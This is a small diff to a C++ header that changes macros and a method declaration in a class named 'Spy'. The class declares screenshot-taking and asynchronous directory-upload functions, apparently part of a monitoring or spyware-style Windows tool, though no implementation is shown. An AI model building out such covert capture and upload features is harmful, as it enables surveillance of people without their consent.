@@ -9,7 +9,6 @@
 #include "../../log-cpp/log.h"
 #include "cfg.h"
 
-#define EXPORT __declspec(dllexport)
 #define ADD_FLAG(state, flag) {state |= flag;}
 #define REM_FLAG(state, flag) {state &= ~flag;}
 #define HAS_FLAG(state, flag) ((state & flag) == flag)
@@ -30,7 +29,7 @@ class Spy
 	static void lock();
 	static void unlock();
 	static void get_temp_fname(char * buffer, int l);
-	static void path_combine(char * dst, const char * dir, const char * fname);
+	static void SPYAPI path_combine(char * dst, const char * dir, const char * fname);
 	static DWORD upload_async(LPVOID * dir_path);
 	static void take_screenshot();
 public:
